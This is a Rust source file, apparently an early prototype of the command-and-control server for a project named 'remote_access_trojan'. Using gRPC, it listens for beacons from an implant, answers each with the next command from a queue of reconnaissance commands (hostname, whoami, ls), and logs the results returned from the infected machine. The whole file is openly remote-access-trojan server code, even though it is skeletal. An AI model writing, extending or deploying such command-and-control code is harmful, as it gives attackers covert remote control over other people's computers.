use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
use tonic::{Request, Response, Status};
use tonic::transport::Server;

#[derive(Default)]
pub struct MyAskForInstructions {}

#[tonic::async_trait]
impl AskForInstructions for MyAskForInstructions {
    async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
        println!("Request={request:?}");
        let fake_commands: Vec<&str> = vec!["hostname", "whoami", "ls"];
        let number: usize = request.into_inner().last_received.try_into().unwrap();
        Ok(Response::new(
            CommandRequest {
                command:String::from(fake_commands[number]),
            }
        ))
    }
}

#[derive(Default)]
pub struct MyRecordCommandResult {}

#[tonic::async_trait]
impl RecordCommandResult for MyRecordCommandResult {
    async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
        println!("Request={request:?}");
        Ok(Response::new(
            Empty {}
        ))
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("server");

    // Can I send a stand up the server?
    let ip_address = rco_config::LISTENER_IP;
    let port = rco_config::LISTENER_PORT;
    let socket = format!("{ip_address}:{port}").parse()?;

    Server::builder()
        .add_service(AskForInstructionsServer::new(MyAskForInstructions::default()))
        .add_service(RecordCommandResultServer::new(MyRecordCommandResult::default()))
        .serve(socket)
        .await?;

    Ok(())
}